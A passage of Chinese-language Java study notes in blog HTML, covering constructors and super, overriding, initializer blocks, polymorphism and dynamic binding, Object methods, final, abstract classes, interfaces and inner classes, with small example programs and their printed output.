title="父类构造器"></a>父类构造器</h2><p>创建子类对象时，默认会调用父类的无参构造器 super( );</p><p>如果父类没有提供无参构造器，须在子类构造器中用 super 去知道使用父类哪个构造器</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">super(参数列表);<br>e<span class="hljs-selector-class">.g</span>.<br>super(name,age,sex);<br></code></pre></td></tr></table></figure><p><strong>super() 和 this() 都只能放在构造器第一行，因此不能共存在同一个构造器；</strong></p><p>3.父类构造器的调用不限于直接父类，一直往上追溯到 Object 类（顶级父类）</p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>用处</p><p>a) 子类和父类具有同名属性和方法时，<strong>默认使用子类的同名属性和方法</strong>。访问父类的属性或方法必须通过 super 来调用</p><p>b) super 代表父类对象的引用，用于访问父类对象的属性、方法、构造器</p><p>访问父类的属性（受访问修饰符影响）</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">super</span>.属性名；<br></code></pre></td></tr></table></figure><p>访问父类的方法（受访问修饰符影响）</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">super</span>.方法名（参数列表）；<br></code></pre></td></tr></table></figure><p>访问父类的构造器</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">super</span>（参数列表）；<br></code></pre></td></tr></table></figure><h1 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h1><p>子类可以重写方法和属性</p><h2 id="方法重写特点"><a href="#方法重写特点" class="headerlink" title="方法重写特点"></a>方法重写特点</h2><ul><li><p>也称为方法覆盖</p></li><li><p>子类方法的名称、参数、与父类完全相同</p></li><li><p>返回类型和父类一样，或则是父类返回类型的子类，比如父类返回类型是 Object，子类返回方法类型是 String</p></li><li><p>子类方法不能缩小父类方法的访问权限</p></li></ul><h2 id="重载与重写的区别"><a href="#重载与重写的区别" class="headerlink" title="重载与重写的区别"></a>重载与重写的区别</h2><p><strong>重载</strong>：<strong>同一个类</strong>，方法名相同，参数类型、个数或顺序不同，与返回值和修饰符无关</p><p><strong>重写</strong>：<strong>父类和子类</strong>中，方法名、参数相同，子类返回类型与父类一样或者是其子类，子类不能缩小父类的缩小访问范围</p><h1 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h1><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><p>可以定义多个，与静态属性初始化优先级一样，按照定义顺序执行，随着类的加载而执行，只执行一次，执行时机比普通代码块早</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">static</span> &#123;<br>       System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;abcdef&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">static</span> &#123;<br>       System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;abcc&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="普通代码块"><a href="#普通代码块" class="headerlink" title="普通代码块"></a>普通代码块</h2><p>可以定义多个，按照定义顺序执行，随着对象创建而执行，提高构造器代码复用性，每次创建对象都会执行</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scala"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">B</span></span>&#123;<br>    public <span class="hljs-type">A</span>()&#123;<br>        <span class="hljs-comment">//1)super()</span><br>        <span class="hljs-comment">//2)调用本类普通代码块</span><br>        <span class="hljs-type">System</span>.out.println(<span class="hljs-string">&quot;3&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="类什么时候被加载"><a href="#类什么时候被加载" class="headerlink" title="类什么时候被加载"></a>类什么时候被加载</h2><ul><li><p>创建对象实例</p></li><li><p>创建子对象实例，父类也会被加载</p></li><li><p>使用类的静态成员时</p></li><li><p>使用子类静态成员时，父类也会被加载</p></li></ul><h2 id="创建对象时的调用顺序"><a href="#创建对象时的调用顺序" class="headerlink" title="创建对象时的调用顺序"></a>创建对象时的调用顺序</h2><ol><li>父类的静态代码块和静态属性初始化</li><li>子类的静态代码块和静态属性初始化</li><li>父类的普通代码块和普通属性初始化</li><li>父类的构造方法</li><li>子类的普通代码块和普通属性初始化</li><li>子类的构造方法</li></ol><p><strong>静态代码块只能调用静态成员，普通代码块可以调用任意成员</strong></p><h2 id="执行-new-Test-会输出什么"><a href="#执行-new-Test-会输出什么" class="headerlink" title="执行 new Test();会输出什么"></a>执行 new Test();会输出什么</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span>&#123;<br>    Demo(String s)&#123;<br>        System.<span class="hljs-keyword">out</span>.println(s);<br>    &#125;<br>    Demo()&#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Demo无参&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span>&#123;<br>    Demo demo1=<span class="hljs-keyword">new</span> Demo(<span class="hljs-string">&quot;Demo1初始化&quot;</span>);    <span class="hljs-comment">//第三步</span><br>    <span class="hljs-keyword">static</span> Demo demo2=<span class="hljs-keyword">new</span> Demo(<span class="hljs-string">&quot;Demo2初始化&quot;</span>); <span class="hljs-comment">//第一步</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;static执行&quot;</span>); <span class="hljs-comment">//第二步</span><br>        <span class="hljs-keyword">if</span>(demo2==<span class="hljs-literal">null</span>)<br>            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;demo2 is null&quot;</span>);<br>    &#125;<br>    Test()&#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Test无参&quot;</span>);   <span class="hljs-comment">//最后一步</span><br>    &#125;<br>&#125;<br>输出：<br>Demo2初始化<br><span class="hljs-keyword">static</span>执行<br>Demo1初始化<br>Test无参<br></code></pre></td></tr></table></figure><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><h2 id="多态参数"><a href="#多态参数" class="headerlink" title="多态参数"></a>多态参数</h2><p>参数定义成父类类型，就可以传任意子类类型进去</p><h2 id="向上转型"><a href="#向上转型" class="headerlink" title="向上转型"></a>向上转型</h2><p><strong>a）</strong> 语法：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">父类类型引用名<span class="hljs-operator">=</span>new子类类型（）；<br></code></pre></td></tr></table></figure><p><strong>b）</strong> 父类引用指向子类对象</p><p><strong>c）</strong> 编译类型看左边，运行类型看右边</p><p><strong>d）</strong> 可以调用父类中所有成员（受访问修饰符影响）</p><p><strong>e）</strong>调用的时候，<strong>子类有就用子类的成员，没有就找父类（就近原则）</strong></p><p><strong>f）</strong>不能调用子类中特有成员</p><h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p><strong>a）</strong>多态的前提：<strong>连个对象（类）存在继承关系</strong></p><p><strong>b）</strong>属性的值看编译类型</p><p><strong>c）</strong>方法都看运行类型，属性看编译类型</p><p><strong>d）</strong> <strong>instanceof</strong> 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型</p><p><strong>e）</strong>要调用子类中的特有成员要向上转型</p><h2 id="多态数组"><a href="#多态数组" class="headerlink" title="多态数组"></a>多态数组</h2><p>数组类型为父类类型，保存实际元素为子类</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(String[] args) throws Exception &#123;<br>        B b=<span class="hljs-keyword">new</span> B();<br>        System.out.println(b.<span class="hljs-keyword">count</span>);<br>        b.<span class="hljs-keyword">display</span>();<br>        A a=b;<br>        System.out.println(a==b);<br>        System.out.println(a.<span class="hljs-keyword">count</span>);<br>        a.<span class="hljs-keyword">display</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-built_in">int</span> <span class="hljs-keyword">count</span>=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">display</span>()&#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.<span class="hljs-keyword">count</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span>&#123;<br>    <span class="hljs-built_in">int</span> <span class="hljs-keyword">count</span>=<span class="hljs-number">200</span>;<br>    <br>    @Override<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">display</span>() &#123;<br>        System.out.println(<span class="hljs-keyword">this</span>.<span class="hljs-keyword">count</span>);<br>    &#125;<br>&#125;<br>输出：<br><span class="hljs-number">200</span><br><span class="hljs-number">200</span><br><span class="hljs-literal">true</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h1 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>) throws Exception</span> &#123;<br>       A a=<span class="hljs-keyword">new</span> B();<br>       System.<span class="hljs-keyword">out</span>.println(a.sum());<br>       System.<span class="hljs-keyword">out</span>.println(a.sum1());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> i=<span class="hljs-number">10</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">sum</span>()</span>&#123;<br>       <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>   &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">sum1</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">getI</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-title">extends</span> <span class="hljs-title">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> i=<span class="hljs-number">20</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">sum</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">getI</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">sum1</span>()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br>输出：<span class="hljs-number">30</span><span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>1.当调用对象方法时，该方法会和该对象内存地址&#x2F;运行类型绑定</p><p>2.当调用对象属性时，没有动态绑定机制，就近原则</p><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>Object 是所有对象的父类，也就是所有对象都可以使用 Object 里面的方法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">equals</span> getClass hashCode toString<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h2><p>判断基本类型和引用类型</p><p>基本类型判断<strong>值</strong>，引用类型判断<strong>地址</strong></p><h2 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h2><p><strong>只能判断引用类型，默认判断地址是否相等</strong></p><p>子类一般会重写 equals 方法，判断内容是否相等，比如 Integer、String</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Person p1=<span class="hljs-built_in">new</span> Person();<br>  p1.name=&quot;abc&quot;;<br>  Person p2=<span class="hljs-built_in">new</span> Person();<br>  p2.name=&quot;abc&quot;;<br>  <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(p1==p2); //<span class="hljs-keyword">False</span><br>  <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(p1.equals(p2));  //<span class="hljs-keyword">False</span><br>  <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(p1.name.equals(p2.name));    //<span class="hljs-keyword">True</span><br>  <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(p1.name==p2.name);   //<span class="hljs-keyword">True</span><br>      <br>  String s1=<span class="hljs-built_in">new</span> String(&quot;a&quot;);<br>  String s2=<span class="hljs-built_in">new</span> String(&quot;a&quot;);<br>  <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(s1==s2); //<span class="hljs-keyword">False</span><br>  <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(s1.equals(s2));  //<span class="hljs-keyword">True</span><br></code></pre></td></tr></table></figure><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><h2 id="toString-方法"><a href="#toString-方法" class="headerlink" title="toString 方法"></a>toString 方法</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span>()</span>&#123;<br>    <span class="hljs-function">retrun <span class="hljs-title">getClass</span>().<span class="hljs-title">getName</span>()+&quot;@&quot;+Integer.<span class="hljs-title">toHexString</span>(<span class="hljs-params">hashCode(</span>))</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>默认返回：全类名+@+哈希值的十六进制</p><p>子类往往重写 toString 方法，用于返回对象的属性信息</p><p>直接输出一个对象时，toString 方法会被默认调用</p><h2 id="finalize-方法"><a href="#finalize-方法" class="headerlink" title="finalize 方法"></a>finalize 方法</h2><p>子类重写该方法，释放资源</p><p>某个对象没有任何引用时，垃圾回收机制会销毁该对象，销毁前调用 finalize 方法</p><p>也可以通过 System.gc() 主动触发垃圾回收机制，但不一定马上回收</p><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>a）不希望类被继承时</p><p>b）不希望属性值被修改时（常量）</p><p>c）不希望父类的方法被子类覆盖&#x2F;重写（override）</p><p>d）不希望局部变量（参数）被修改（局部变量）</p><p><strong>final修饰实例属性，可以在定义时，构造器、普通代码块中赋值</strong></p><p><strong>final修饰静态属性，可以在定义时、静态代码块中赋初值</strong></p><h2 id="final-注意事项"><a href="#final-注意事项" class="headerlink" title="final 注意事项"></a>final 注意事项</h2><p>a）final 修饰属性必须赋值，并且不可修改</p><p>b）final 可以修饰类、属性、方法和局部变量，不能修饰构造器</p><p>c）包装类（Double、Integer、Float、Boolean ）和 String 都是 final 类</p><p>d）final 修饰类不能被继承，但能被实例化（需要不被实例化把类改成 private）</p><p>e）final 和 static 搭配使用不会加载类</p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><h2 id="abstract-只能修饰类和方法"><a href="#abstract-只能修饰类和方法" class="headerlink" title="abstract 只能修饰类和方法"></a>abstract 只能修饰类和方法</h2><p>用 abstract 关键字修饰一个类时，这个类就叫抽象类，修饰方法时就叫抽象方法</p><h2 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h2><p>抽象类可以有任意成员，可以被继承，可以没有抽象方法</p><p><strong>抽象类不能被实例化</strong></p><p>有了抽象方法，这个类必须声明为 abstract</p><p>继承了抽象类，必须实现抽象类的所有抽象方法，除非它自己也声明为 abstract 类</p><p><strong>抽象方法不能使用 private、final 和 static 修饰</strong></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-title class_"><span class="hljs-keyword">interface</span> 接口名</span>&#123;<br><span class="hljs-comment">//属性</span><br><span class="hljs-comment">//方法</span><br>&#125;<br><span class="hljs-title class_"><span class="hljs-keyword">class</span> 类名 <span class="hljs-keyword"><span class="hljs-keyword">implements</span> </span>接口名</span>&#123;<br>必须实现接口的所有抽象方法<br>&#125;<br></code></pre></td></tr></table></figure><p>用来制定规则</p><h2 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>不能被实例化</li><li>接口的修饰只能是 public 和默认，这点和类的修饰符是一样的</li><li>不能继承其他的类，但可以继承多个别的接口</li><li>接口中的方法都是 public 方法，抽象方法可以不用 abstract 修饰，public abstract 可以省略</li><li>一个普通类实现接口就必须将该接口的所有方法实现</li><li>抽象类实现接口，可以不用实现接口的方法</li><li>一个类同时可以实现多个接口</li><li>接口中的属性都是 <strong>public static final</strong> 修饰符</li></ul><p>​访问形式：<strong>接口名. 属性名</strong></p><h2 id="接口的多态特性"><a href="#接口的多态特性" class="headerlink" title="接口的多态特性"></a>接口的多态特性</h2><p>多态参数、向上转型、多态数组</p><h2 id="接口的多态传递"><a href="#接口的多态传递" class="headerlink" title="接口的多态传递"></a>接口的多态传递</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">B</span>()<br><span class="hljs-symbol">interface</span> <span class="hljs-symbol">A</span> <span class="hljs-symbol">extends</span> <span class="hljs-symbol">B</span>()<br><span class="hljs-symbol">class</span> <span class="hljs-symbol">C</span> <span class="hljs-symbol">implements</span>  <span class="hljs-symbol">A</span>&#123;&#125;<br>B b=new C();<br>A a=new C();<br></code></pre></td></tr></table></figure><h2 id="接口、继承"><a href="#接口、继承" class="headerlink" title="接口、继承"></a>接口、继承</h2><p>继承：提高代码复用性和可维护性</p><p>接口：设计好各种方法，让其他类去实现</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">interface</span> <span class="hljs-symbol">AA</span>&#123;<span class="hljs-built_in">int</span> a=<span class="hljs-number">23</span>;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-symbol">BB</span> <span class="hljs-symbol">implements</span> <span class="hljs-symbol">AA</span>&#123;&#125;<br><br>main函数中：<br> BB b=new BB();<br>    System.<span class="hljs-keyword">out</span>.println(b.a);<br>    System.<span class="hljs-keyword">out</span>.println(AA.a);<br>    System.<span class="hljs-keyword">out</span>.println(BB.a);<br></code></pre></td></tr></table></figure><h1 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>定义在外部类的成员位置上</p><p>a）成员内部类（无 static 修饰）</p><p>b）静态内部类（使用 static 修饰）</p><p>定义在外部类的局部位置上（比如方法类）：</p><p>a）局部内部类（有类名）</p><p>b）匿名内部类（没有类名）</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的成员位置上，没有 static 修饰</p><h2 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类的所有成员，包含私有的</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">class</span> OuterClass&#123;<br>    <span class="hljs-built_in">public</span> String <span class="hljs-type">name</span>=&quot;butterfly&quot;;<br>    private <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">boolean</span> sex=<span class="hljs-keyword">true</span>;<br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> test()&#123;&#125;<br>    <br>    static &#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;OuterClass static block&quot;);<br>    &#125;<br>    <span class="hljs-built_in">public</span> OuterClass(String <span class="hljs-type">name</span>,<span class="hljs-type">int</span> age)&#123;<br>        this.name=<span class="hljs-type">name</span>;<br>        this.age=age;<br>    &#125;<br>    <span class="hljs-keyword">class</span> InnerClass&#123;<br>        <span class="hljs-built_in">public</span> String <span class="hljs-keyword">language</span>=&quot;java&quot;;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> abc() &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-type">name</span>);<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(age);<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(sex);<br>            test();<br>        &#125;<br>        &#123;<br>            <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;InnerClass block&quot;);<br>        &#125;<br>        <span class="hljs-built_in">public</span> InnerClass(String <span class="hljs-keyword">language</span>)&#123;<br>            this.<span class="hljs-keyword">language</span>=<span class="hljs-keyword">language</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以添加任意访问修饰符去修饰成员内部类，因为相当于一个成员</li><li>成员内部类不能定义静态成员</li><li>作用域与其他成员一样</li><li>外部类可以访问成员内部类</li><li>外部其他类可以访问成员内部类</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">new</span> Test()..<span class="hljs-function"><span class="hljs-keyword">new</span> <span class="hljs-title">Inner</span>()</span>;<br></code></pre></td></tr></table></figure><p>​在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.this.成员）去访问</li></ul><h2 id="获取内部类的类名"><a href="#获取内部类的类名" class="headerlink" title="获取内部类的类名"></a>获取内部类的类名</h2><p>getClass、jeb</p><h1 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>有 static 修饰</p><h2 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>只能访问外部类的静态成员，包含私有的</p></li><li><p>作用域属于整个类</p></li><li><p>可以添加任意访问修饰符去修饰静态内部类</p></li><li><p>外部类可以访问静态内部类</p></li><li><p>外部其他类可以访问静态内部类</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">new</span> Test.<span class="hljs-keyword">Inner</span>();<br></code></pre></td></tr></table></figure><p>在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.静态成员名）去访问</li></ul></li></ul><h1 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的局部位置上，比如方法中，并且有类名</p><h2 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类所有成员</li><li>如果定义在静态方法中，只能访问外部类的静态成员</li><li>不能添加访问修饰符，可以用final 修饰</li><li>作用域仅在代码块中，与局部变量一致</li><li>重名遵循就近原则，访问外部类成员用<strong>（外部类名.this.成员）</strong>去访问（实例方法中），静态方法中，（外部类名.静态成员名）访问</li><li>外部类不能访问局部内部类</li></ul><h1 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>基于接口的匿名内部类</p><p>基于类（抽象类）的匿名内部类</p><h2 id="注意事项-7"><a href="#注意事项-7" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以访问外部类，受访问修饰符影响，局部内部类不能定义静态成员</li><li>只能创建一个实例</li><li>就近原则，匿名内部类处于外部类里面时<strong>（外部类名.this.成员）</strong>静态成员（外部类名.静态类名）</li><li>外部类不能访问匿名内部类</li><li>匿名内部类在定义的同时直接创建对象，并且当作实参传递</li></ul><h1 id="枚举类"><a href="#枚举类" class="headerlink" 